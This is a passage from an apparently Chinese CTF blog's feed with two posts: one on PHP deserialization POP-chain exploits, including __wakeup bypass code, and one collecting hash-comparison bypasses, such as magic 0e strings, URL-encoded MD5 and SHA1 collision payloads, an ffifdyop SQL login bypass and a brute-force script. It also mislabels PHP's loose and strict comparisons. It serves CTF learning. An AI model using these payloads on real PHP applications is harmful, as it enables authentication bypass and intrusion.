class="variable">$a</span> = <span class="keyword">new</span> <span class="built_in">Exception</span>(<span class="variable">$cmd</span>);</span><br><span class="line"><span class="variable">$b</span> = <span class="keyword">new</span> <span class="built_in">Exception</span>(<span class="variable">$cmd</span>,<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$tr</span> = <span class="keyword">new</span> CDUTSEC;</span><br><span class="line"><span class="variable">$tr</span>-&gt;var1=<span class="variable">$a</span>;</span><br><span class="line"><span class="variable">$tr</span>-&gt;var2=<span class="variable">$b</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$tr</span>));</span><br></pre></td></tr></table></figure><h2 id="weakup置空绕过">weakup置空绕过</h2><p>这里举个例子：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>, <span class="variable">$b</span>, <span class="variable">$t</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;a = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;b = <span class="variable language_">$this</span>-&gt;t;</span><br><span class="line">        <span class="title function_ invoke__">var_dump</span>(<span class="variable">$this</span>-&gt;a);</span><br><span class="line">        <span class="keyword">die</span>(<span class="variable language_">$this</span>-&gt;a);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;flag&#123;test&#125;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>求怎么拿到flag。这里直接构造$this-&gt;a=new B; 是不行的，因为wakeup会把a设为空字符串。<br>先给 exp</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$A</span> = <span class="keyword">new</span> A;</span><br><span class="line"><span class="variable">$B</span> = <span class="keyword">new</span> B;</span><br><span class="line"><span class="variable">$A</span>-&gt;a = &amp;<span class="variable">$A</span>-&gt;b;</span><br><span class="line"><span class="variable">$A</span>-&gt;t = <span class="variable">$B</span>;</span><br><span class="line"><span class="variable">$payload</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$A</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$payload</span>;</span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="variable">$payload</span>);</span><br></pre></td></tr></table></figure><pre><code>$A-&gt;a = &amp;$A-&gt;b 是为了处理__wakeup()的置空，这样 die($this-&gt;a)就会变成 die($this-&gt;b)，__destruct()中 $this-&gt;b=$this-&gt;t ，控制$A-&gt;t为后续的链子。  虽然 die($this-&gt;a)会触发__toString()，但因为 __wakeup() 会在序列化的时候调用，会覆盖$this-&gt;a 的值为空。触发 __toString() 时实际执行的是$this-&gt;&quot;&quot;-&gt;rce()。链子会断开</code></pre><h2 id="绕过反复调用">绕过反复调用</h2><p>多实例化一个对象<br>举个例子：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>, <span class="variable">$c</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;a;</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$var</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">        <span class="variable">$f</span> = <span class="variable language_">$this</span>-&gt;c;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$f</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$b</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__tostring</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;b-&gt;lll;</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;flag&#123;test&#125;&quot;</span>;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>exp如下：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$A1</span> = <span class="keyword">new</span> A;</span><br><span class="line"><span class="variable">$A2</span> = <span class="keyword">new</span> A;</span><br><span class="line"><span class="variable">$B</span> = <span class="keyword">new</span> B;</span><br><span class="line"><span class="variable">$A1</span>-&gt;a = <span class="variable">$B</span>;</span><br><span class="line"><span class="variable">$B</span>-&gt;b = <span class="variable">$A2</span>;</span><br><span class="line"><span class="variable">$A2</span>-&gt;a = <span class="variable">$B</span>;</span><br><span class="line"><span class="variable">$payload</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$A1</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$payload</span>;</span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="variable">$payload</span>);</span><br></pre></td></tr></table></figure><h1 id="结尾">结尾</h1><p>参考文献<br><a href="https://5ime.cn/unserialize.html">https://5ime.cn/unserialize.html</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;写在前面&quot;&gt;写在前面&lt;/h1&gt;
&lt;p&gt;构造 pop 链，归根结底就是一条绳子，从你开始的函数穿到危险函数（或者指向 flag），所以你要做的第一件事，就是确认你的开始和结尾。&lt;/p&gt;
&lt;h1 id=&quot;部分魔术方法触发方法&quot;&gt;部分魔术方法触发方法&lt;/h1&gt;
&lt;pre</summary>
      
    
    
    
    <category term="CTF" scheme="https://blog.hatchet.top/categories/CTF/"/>
    
    
    <category term="web" scheme="https://blog.hatchet.top/tags/web/"/>
    
    <category term="PHP" scheme="https://blog.hatchet.top/tags/PHP/"/>
    
  </entry>
  
  <entry>
    <title>常见的哈希函数绕过个人收藏</title>
    <link href="https://blog.hatchet.top/posts/66a71aff.html"/>
    <id>https://blog.hatchet.top/posts/66a71aff.html</id>
    <published>2024-08-24T22:32:27.000Z</published>
    <updated>2024-10-24T10:49:19.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="写在前面">写在前面</h1><ul><li>php 对 MD5 加密方法为$a=md5(‘string’);比起 python 就是神仙级，壮哉 php。</li><li>php 中存在强比较(==/!=)和弱比较(===/!==)，两个数组能绕过强和弱两个比较(a[]=1&amp;b[]=2)，因为 md5 不会处理数组，返回的结果都为 bool(false)</li><li>0e+纯数字的字符串会使 php 误认为是科学计数法, 从而转换为 0。</li><li><ul><li>只能绕过弱比较，<strong>且仅为 0e 开头的字符串是不能绕过比较的。</strong></li></ul></li><li>md5($password,‘true’)-&gt;ffifdyop 多用于 sql 绕过密码</li></ul><h1 id="MD4">MD4</h1><h2 id="md4-等于自己-a-md4-a">md4 等于自己 -&gt; <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>a</mi><mo>=</mo><mo>=</mo><mi>m</mi><mi>d</mi><mn>4</mn><mo stretchy="false">(</mo></mrow><annotation encoding="application/x-tex">a==md4(</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">a</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">==</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">m</span><span class="mord mathnormal">d</span><span class="mord">4</span><span class="mopen">(</span></span></span></span>a);</h2><pre><code>0e251288019 0e898201062</code></pre><h1 id="MD5">MD5</h1><h2 id="md5-后-0e-数字-md5-a-md5-b">md5 后 0e+数字 -&gt; md5(<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>a</mi><mo stretchy="false">)</mo><mo>=</mo><mo>=</mo><mi>m</mi><mi>d</mi><mn>5</mn><mo stretchy="false">(</mo></mrow><annotation encoding="application/x-tex">a)==md5(</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">a</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">==</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">m</span><span class="mord mathnormal">d</span><span class="mord">5</span><span class="mopen">(</span></span></span></span>b)</h2><p>部分</p><pre><code>byGcY sonZ7y QNKCDZO 240610708 s878926199a s155964671a s214587387a</code></pre><h2 id="md5-后-等于自己-a-md5-a">md5 后 等于自己 -&gt; <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>a</mi><mo>=</mo><mo>=</mo><mi>m</mi><mi>d</mi><mn>5</mn><mo stretchy="false">(</mo></mrow><annotation encoding="application/x-tex">a==md5(</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">a</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">==</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">m</span><span class="mord mathnormal">d</span><span class="mord">5</span><span class="mopen">(</span></span></span></span>a)</h2><p>很多</p><pre><code>0e215962017 0e00275209979 0e00506035745 0e005404518110e00678205148 0e00741250258 0e00928251504 0e013500161140e01352028862 0e01392313004 0e01875552079 0e019759039830e02042356163 0e02218562930 0e02451355147 0e027399702940e02760920150 0e02784726287 0e03298616350 0e03393034171</code></pre><h2 id="双-md5-后等于自己-a-md5-md5-a-（没错真的有这个数）">双 md5 后等于自己 -&gt; <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>a</mi><mo>=</mo><mo>=</mo><mi>m</mi><mi>d</mi><mn>5</mn><mo stretchy="false">(</mo><mi>m</mi><mi>d</mi><mn>5</mn><mo stretchy="false">(</mo></mrow><annotation encoding="application/x-tex">a==md5(md5(</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">a</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">==</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">m</span><span class="mord mathnormal">d</span><span class="mord">5</span><span class="mopen">(</span><span class="mord mathnormal">m</span><span class="mord mathnormal">d</span><span class="mord">5</span><span class="mopen">(</span></span></span></span>a)) （没错真的有这个数）</h2><p>0e1138100474</p><h2 id="单-md5-后等于双-md5-后的自己-md5-a-md5-md5-a">单 md5 后等于双 md5 后的自己 -&gt; md5(<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>a</mi><mo stretchy="false">)</mo><mo>=</mo><mo>=</mo><mi>m</mi><mi>d</mi><mn>5</mn><mo stretchy="false">(</mo><mi>m</mi><mi>d</mi><mn>5</mn><mo stretchy="false">(</mo></mrow><annotation encoding="application/x-tex">a)==md5(md5(</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">a</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">==</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">m</span><span class="mord mathnormal">d</span><span class="mord">5</span><span class="mopen">(</span><span class="mord mathnormal">m</span><span class="mord mathnormal">d</span><span class="mord">5</span><span class="mopen">(</span></span></span></span>a))</h2><p>（施工中）</p><h2 id="如果你可以-serialize-反序列化控制数字，而题目限制了字符长度为-5-以下">如果你可以 serialize 反序列化控制数字，而题目限制了字符长度为 5 以下</h2><p>那你可以试试 INF 和 NAN 两个数字，因为无法求值，它们的 md5 值就是字符串的 md5 值</p><h2 id="md5-强相等碰撞-md5-a-md5-b-md5-c">md5 强相等碰撞 -&gt; md5(<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>a</mi><mo stretchy="false">)</mo><mo>=</mo><mo>=</mo><mo>=</mo><mi>m</mi><mi>d</mi><mn>5</mn><mo stretchy="false">(</mo></mrow><annotation encoding="application/x-tex">a)===md5(</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">a</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">===</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">m</span><span class="mord mathnormal">d</span><span class="mord">5</span><span class="mopen">(</span></span></span></span>b)===md5($c)</h2><pre><code>a=%af%13%76%70%82%a0%a6%58%cb%3e%23%38%c4%c6%db%8b%60%2c%bb%90%68%a0%2d%e9%47%aa%78%49%6e%0a%c0%c0%31%d3%fb%cb%82%25%92%0d%cf%61%67%64%e8%cd%7d%47%ba%0e%5d%1b%9c%1c%5c%cd%07%2d%f7%a8%2d%1d%bc%5e%2c%06%46%3a%0f%2d%4b%e9%20%1d%29%66%a4%e1%8b%7d%0c%f5%ef%97%b6%ee%48%dd%0e%09%aa%e5%4d%6a%5d%6d%75%77%72%cf%47%16%a2%06%72%71%c9%a1%8f%00%f6%9d%ee%54%27%71%be%c8%c3%8f%93%e3%52%73%73%53%a0%5f%69%ef%c3%3b%ea%ee%70%71%ae%2a%21%c8%44%d7%22%87%9f%be%79%6d%c4%61%a4%08%57%02%82%2a%ef%36%95%da%ee%13%bc%fb%7e%a3%59%45%ef%25%67%3c%e0%27%69%2b%95%77%b8%cd%dc%4f%de%73%24%e8%ab%66%74%d2%8c%68%06%80%0c%dd%74%ae%31%05%d1%15%7d%c4%5e%bc%0b%0f%21%23%a4%96%7c%17%12%d1%2b%b3%10%b7%37%60%68%d7%cb%35%5a%54%97%08%0d%54%78%49%d0%93%c3%b3%fd%1f%0b%35%11%9d%96%1d%ba%64%e0%86%ad%ef%52%98%2d%84%12%77%bb%ab%e8%64%da%a3%65%55%5d%d5%76%55%57%46%6c%89%c9%df%b2%3c%85%97%1e%f6%38%66%c9%17%22%e7%ea%c9%f5%d2%e0%14%d8%35%4f%0a%5c%34%d3%73%a5%98%f7%66%72%aa%43%e3%bd%a2%cd%62%fd%69%1d%34%30%57%52%ab%41%b1%91%65%f2%30%7f%cf%c6%a1%8c%fb%dc%c4%8f%61%a5%93%40%1a%13%d1%09%c5%e0%f7%87%5f%48%e7%d7%b3%62%04%a7%c4%cb%fd%f4%ff%cf%3b%74%28%1c%96%8e%09%73%3a%9b%a6%2f%ed%b7%99%d5%b9%05%39%95%ab&amp;b=%af%13%76%70%82%a0%a6%58%cb%3e%23%38%c4%c6%db%8b%60%2c%bb%90%68%a0%2d%e9%47%aa%78%49%6e%0a%c0%c0%31%d3%fb%cb%82%25%92%0d%cf%61%67%64%e8%cd%7d%47%ba%0e%5d%1b%9c%1c%5c%cd%07%2d%f7%a8%2d%1d%bc%5e%2c%06%46%3a%0f%2d%4b%e9%20%1d%29%66%a4%e1%8b%7d%0c%f5%ef%97%b6%ee%48%dd%0e%09%aa%e5%4d%6a%5d%6d%75%77%72%cf%47%16%a2%06%72%71%c9%a1%8f%00%f6%9d%ee%54%27%71%be%c8%c3%8f%93%e3%52%73%73%53%a0%5f%69%ef%c3%3b%ea%ee%70%71%ae%2a%21%c8%44%d7%22%87%9f%be%79%6d%c4%61%a4%08%57%02%82%2a%ef%36%95%da%ee%13%bc%fb%7e%a3%59%45%ef%25%67%3c%e0%27%69%2b%95%77%b8%cd%dc%4f%de%73%24%e8%ab%66%74%d2%8c%68%06%80%0c%dd%74%ae%31%05%d1%15%7d%c4%5e%bc%0b%0f%21%23%a4%96%7c%17%12%d1%2b%b3%10%b7%37%60%68%d7%cb%35%5a%54%97%08%0d%54%78%49%d0%93%c3%b3%fd%1f%0b%35%11%9d%96%1d%ba%64%e0%86%ad%ef%52%98%2d%84%12%77%bb%ab%e8%64%da%a3%65%55%5d%d5%76%55%57%46%6c%89%c9%5f%b2%3c%85%97%1e%f6%38%66%c9%17%22%e7%ea%c9%f5%d2%e0%14%d8%35%4f%0a%5c%34%d3%f3%a5%98%f7%66%72%aa%43%e3%bd%a2%cd%62%fd%e9%1d%34%30%57%52%ab%41%b1%91%65%f2%30%7f%cf%c6%a1%8c%fb%dc%c4%8f%61%a5%13%40%1a%13%d1%09%c5%e0%f7%87%5f%48%e7%d7%b3%62%04%a7%c4%cb%fd%f4%ff%cf%3b%74%a8%1b%96%8e%09%73%3a%9b%a6%2f%ed%b7%99%d5%39%05%39%95%ab&amp;c=%af%13%76%70%82%a0%a6%58%cb%3e%23%38%c4%c6%db%8b%60%2c%bb%90%68%a0%2d%e9%47%aa%78%49%6e%0a%c0%c0%31%d3%fb%cb%82%25%92%0d%cf%61%67%64%e8%cd%7d%47%ba%0e%5d%1b%9c%1c%5c%cd%07%2d%f7%a8%2d%1d%bc%5e%2c%06%46%3a%0f%2d%4b%e9%20%1d%29%66%a4%e1%8b%7d%0c%f5%ef%97%b6%ee%48%dd%0e%09%aa%e5%4d%6a%5d%6d%75%77%72%cf%47%16%a2%06%72%71%c9%a1%8f%00%f6%9d%ee%54%27%71%be%c8%c3%8f%93%e3%52%73%73%53%a0%5f%69%ef%c3%3b%ea%ee%70%71%ae%2a%21%c8%44%d7%22%87%9f%be%79%ed%c4%61%a4%08%57%02%82%2a%ef%36%95%da%ee%13%bc%fb%7e%a3%59%45%ef%25%67%3c%e0%a7%69%2b%95%77%b8%cd%dc%4f%de%73%24%e8%ab%e6%74%d2%8c%68%06%80%0c%dd%74%ae%31%05%d1%15%7d%c4%5e%bc%0b%0f%21%23%a4%16%7c%17%12%d1%2b%b3%10%b7%37%60%68%d7%cb%35%5a%54%97%08%0d%54%78%49%d0%93%c3%33%fd%1f%0b%35%11%9d%96%1d%ba%64%e0%86%ad%6f%52%98%2d%84%12%77%bb%ab%e8%64%da%a3%65%55%5d%d5%76%55%57%46%6c%89%c9%df%b2%3c%85%97%1e%f6%38%66%c9%17%22%e7%ea%c9%f5%d2%e0%14%d8%35%4f%0a%5c%34%d3%73%a5%98%f7%66%72%aa%43%e3%bd%a2%cd%62%fd%69%1d%34%30%57%52%ab%41%b1%91%65%f2%30%7f%cf%c6%a1%8c%fb%dc%c4%8f%61%a5%93%40%1a%13%d1%09%c5%e0%f7%87%5f%48%e7%d7%b3%62%04%a7%c4%cb%fd%f4%ff%cf%3b%74%28%1c%96%8e%09%73%3a%9b%a6%2f%ed%b7%99%d5%b9%05%39%95%ab</code></pre><p>数据大抵是没有问题的，出错可以试着检查下是否支持 url 编码，这里点名 绿色 hackbar，感觉直接传 url 编码的参数总会报错。打 web 做这种题一定要用 burpsuite 传参，鬼知道出什么问题，，有能力的可以 python 写 request</p><h2 id="md5-相同生成工具-fastcoll">md5 相同生成工具 fastcoll</h2><p><a href="https://www.win.tue.nl/hashclash/fastcoll_v1.0.0.5.exe.zip">https://www.win.tue.nl/hashclash/fastcoll_v1.0.0.5.exe.zip</a></p><pre><code>fastcoll -o a a1</code></pre><p>可以得到两个相同的 MD5 值的文件，ulencode 后传入。</p><h1 id="SHA1">SHA1</h1><h2 id="sha1-后-0e-数字-sha1-a-sha1-b">sha1 后 0e+数字 -&gt; sha1(<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>a</mi><mo stretchy="false">)</mo><mo>=</mo><mo>=</mo><mi>s</mi><mi>h</mi><mi>a</mi><mn>1</mn><mo stretchy="false">(</mo></mrow><annotation encoding="application/x-tex">a)==sha1(</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">a</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">==</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">s</span><span class="mord mathnormal">ha</span><span class="mord">1</span><span class="mopen">(</span></span></span></span>b)</h2><p>aaroZmOk aaK1STfY aaO8zKZF aa3OFF9m<br>f2WfQ iv2Cn</p><h2 id="sha1-强相等碰撞-sha1-a-sha1-b">sha1 强相等碰撞 -&gt; sha1($a)===sha1(b)</h2><pre><code>array1=%25PDF-1.3%0A%25%E2%E3%CF%D3%0A%0A%0A1%200%20obj%0A%3C%3C/Width%202%200%20R/Height%203%200%20R/Type%204%200%20R/Subtype%205%200%20R/Filter%206%200%20R/ColorSpace%207%200%20R/Length%208%200%20R/BitsPerComponent%208%3E%3E%0Astream%0A%FF%D8%FF%FE%00%24SHA-1%20is%20dead%21%21%21%21%21%85/%EC%09%239u%9C9%B1%A1%C6%3CL%97%E1%FF%FE%01%7FF%DC%93%A6%B6%7E%01%3B%02%9A%AA%1D%B2V%0BE%CAg%D6%88%C7%F8K%8CLy%1F%E0%2B%3D%F6%14%F8m%B1i%09%01%C5kE%C1S%0A%FE%DF%B7%608%E9rr/%E7%ADr%8F%0EI%04%E0F%C20W%0F%E9%D4%13%98%AB%E1.%F5%BC%94%2B%E35B%A4%80-%98%B5%D7%0F%2A3.%C3%7F%AC5%14%E7M%DC%0F%2C%C1%A8t%CD%0Cx0Z%21Vda0%97%89%60k%D0%BF%3F%98%CD%A8%04F%29%A1&amp;array2=%25PDF-1.3%0A%25%E2%E3%CF%D3%0A%0A%0A1%200%20obj%0A%3C%3C/Width%202%200%20R/Height%203%200%20R/Type%204%200%20R/Subtype%205%200%20R/Filter%206%200%20R/ColorSpace%207%200%20R/Length%208%200%20R/BitsPerComponent%208%3E%3E%0Astream%0A%FF%D8%FF%FE%00%24SHA-1%20is%20dead%21%21%21%21%21%85/%EC%09%239u%9C9%B1%A1%C6%3CL%97%E1%FF%FE%01sF%DC%91f%B6%7E%11%8F%02%9A%B6%21%B2V%0F%F9%CAg%CC%A8%C7%F8%5B%A8Ly%03%0C%2B%3D%E2%18%F8m%B3%A9%09%01%D5%DFE%C1O%26%FE%DF%B3%DC8%E9j%C2/%E7%BDr%8F%0EE%BC%E0F%D2%3CW%0F%EB%14%13%98%BBU.%F5%A0%A8%2B%E31%FE%A4%807%B8%B5%D7%1F%0E3.%DF%93%AC5%00%EBM%DC%0D%EC%C1%A8dy%0Cx%2Cv%21V%60%DD0%97%91%D0k%D0%AF%3F%98%CD%A4%BCF%29%B1</code></pre><h2 id="sha1-后等于自己">sha1 后等于自己</h2><pre><code>              text                                            SHA1 Hash0e00000000000000000000081614617300000000 ==&gt; 0e653075259409996322874922854682592190700e00000000000000000000721902017120000000 ==&gt; 0e949811594982522954181824538411404832740e01011001101011010001101110101100101000 ==&gt; 0e489065231519767511176774637871111065980e11001000001010011000100000010001101000 ==&gt; 0e634071849609304190270627777050813794520e01000001100000001010011011001000000100 ==&gt; 0e559620723883970838143467337186982137960e10011110000101101000011101011010100100 ==&gt; 0e311885854172858287853553367742377127920e01010111000111111010101011010111010100 ==&gt; 0e459063445696166594288088920912619691810e00100001110000001111010000010011101100 ==&gt; 0e148602586690523325495686077104381329530e11110000111010001001101111111110010010 ==&gt; 0e121742584363857585528744269416865384830e10111110011100101100010101111010000110 ==&gt; 0e997743982825933760434620385722813853890e11001111110111110010111010000011110110 ==&gt; 0e631852213010346249403454710743578887970e00001010010101100100101011101110001110 ==&gt; 0e909439887721717490544135938881059867820e01011101110010111011110010010010101110 ==&gt; 0e016088001926598035767713466074417378260e10111110101111001000000100011101101110 ==&gt; 0e490945414584794952630342944210251869380e11100111101110011010111001010101111110 ==&gt; 0e557707061499487600862007135058418875430e11111001010101100110011001010001110001 ==&gt; 0e911206871211638095158241354350299581370e01000111101111110010010010000001001001 ==&gt; 0e780717973285463693018254208488724518490e00100110100010100110001101110110110101 ==&gt; 0e060773804082606146592199205610827676320e11111100001011000011110100100010111101 ==&gt; 0e121491203544153352207583994927139215880e00111100110101101001000101011011111101 ==&gt; 0e386611265697905555984319050654038705160e10100011100101000001110010100110100011 ==&gt; 0e557450781546402125115962590559102780700e10011110011111001001100100000111011011 ==&gt; 0e20319731123101477913295720812414482217</code></pre><h1 id="自己爆破用脚本">自己爆破用脚本</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">is_valid_md5</span>(<span class="params">md5_hash</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;检查MD5哈希值是否以0e开头并且后面跟随纯数字&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">return</span> md5_hash.startswith(<span class="string">&quot;0e&quot;</span>) <span class="keyword">and</span> md5_hash[<span class="number">2</span>:].isdigit()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">find_valid_a</span>():</span><br><span class="line">    <span class="string">&quot;&quot;&quot;暴力求解a，使得md5(a)和md5(md5(a))都满足条件&quot;&quot;&quot;</span></span><br><span class="line">    chars = (</span><br><span class="line">        string.ascii_lowercase + string.ascii_uppercase + string.digits</span><br><span class="line">    )  <span class="comment"># 允许的字符集</span></span><br><span class="line">    <span class="keyword">for</span> length <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">10</span>):  <span class="comment"># 控制a的长度</span></span><br><span class="line">        <span class="built_in">print</span>(length)</span><br><span class="line">        <span class="keyword">for</span> candidate <span class="keyword">in</span> itertools.product(chars, repeat=length):</span><br><span class="line">            a = <span class="string">&quot;&quot;</span>.join(candidate)</span><br><span class="line">            md5_a = hashlib.md5(a.encode()).hexdigest()</span><br><span class="line">            md5_md5_a = hashlib.md5(md5_a.encode()).hexdigest()</span><br><span class="line">            <span class="keyword">if</span> is_valid_md5(md5_a) <span class="keyword">and</span> is_valid_md5(md5_md5_a):</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;Found a: <span class="subst">&#123;a&#125;</span>&quot;</span>)</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;md5(a): <span class="subst">&#123;md5_a&#125;</span>&quot;</span>)</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;md5(md5(a)): <span class="subst">&#123;md5_md5_a&#125;</span>&quot;</span>)</span><br><span class="line">                <span class="keyword">return</span> a</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 执行暴力求解</span></span><br><span class="line">find_valid_a()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="哈希长度拓展攻击">哈希长度拓展攻击</h1><p>已知部分字符串需要构造相同 md5 值<br>需要知道 key 长度</p><h1 id="说在后面">说在后面</h1><p>我在一开始学习 MD5 绕过时吃了很多亏。还是被勾币出题人拷打少了，导致很多打只能自己硬咽下去。这是博客的一篇文章，在写之时深深感慨自己在茫茫搜索 MD5 时的无力，到自己写时，大大弥补加了很多自己当时搜索时的关键词，希望有点帮助吧。。。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;写在前面&quot;&gt;写在前面&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;php 对 MD5 加密方法为$a=md5(‘string’);比起 python 就是神仙级，壮哉 php。&lt;/li&gt;
&lt;li&gt;php 中存在强比较(==/!=)和弱比较(===/!==)，两个数组能绕过强和弱两</summary>
      
    
    
    
    <category term="CTF" scheme="https://blog.hatchet.top/categories/CTF/"/>
    
    
    <category term="crypto" scheme="https://blog.hatchet.top/tags/crypto/"/>
    
